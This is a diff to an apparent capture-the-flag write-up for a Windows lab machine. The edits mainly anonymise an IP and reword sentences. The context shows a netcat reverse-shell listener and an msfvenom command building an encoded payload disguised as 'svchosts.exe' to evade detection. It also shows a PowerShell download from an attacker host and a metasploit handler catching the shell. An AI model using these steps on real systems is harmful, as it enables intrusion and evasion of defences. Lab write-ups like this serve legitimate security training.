@@ -113,7 +113,7 @@ WIN!
 ```
 rlwrap nc -lvnp 4444                                                                                                                                        9 ⚙
 listening on [any] 4444 ...
-connect to [10.6.40.191] from (UNKNOWN) [10.10.27.251] 49355
+connect to [Tun0-IP] from (UNKNOWN) [10.10.27.251] 49355
 ```
 ```ps
 Windows PowerShell running as user bruce on ALFRED
@@ -128,7 +128,7 @@ Now, we can begin looking for the user.txt flag! Use type user.txt to read the f
 
 ## Task 2: Switching Shells
 
-Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. Let's use msfvenom to create a reverse shell. We're going to encode it and name it similarly to a legitimate binary service to avoid detection.
+Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. We are going to use msfvenom to create a reverse shell payload. We should encode it and name it similarly to a legitimate binary service to avoid detection.
 
 '''
 msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
@@ -136,11 +136,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga
 
 **What is the final size of the exe payload that you generated?**
 
-After creating the payload we will see the final size for our fake service in the output.
+After creating the payload, we will see the final size for our fake service host in the output.
 
-Now that we have our payload, we need to download it onto the device and access it through metasploit.
+Now that we have our payload, we need to transfer it onto the target and catch it with metasploit multi handler.
 
-Let's download it using our powershell session we got earlier with netcat off the server. Navigate to C:\Perflogs and then transfer the file off the server.
+Let's transfer it using our powershell session we got earlier with netcat off the server. Navigate to C:\Perflogs and then transfer the file off the server onto the target.
 
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://Tun0-IP:8000/svchosts.exe','svchosts.exe')"
@@ -152,7 +152,7 @@ Let's jump over and start up a metasploit session using exploit/multi/handler be
 
 Check to make sure the payload is correctly set to windows/meterpreter/reverse_tcp. It should be the default when opening msfconsole.
 
-Show options and set the LPORT to 5555, along with the LHOST to the Tun0-IP. Run the exploit and execute the binary on the device with the powershell session you have.
+Show options and set the LPORT to 5555, along with the LHOST to the Tun0-IP. Run the exploit and execute the binary on the device with the netcat powershell session.
 
 ```ps
 Start-Process "svchosts.exe" 
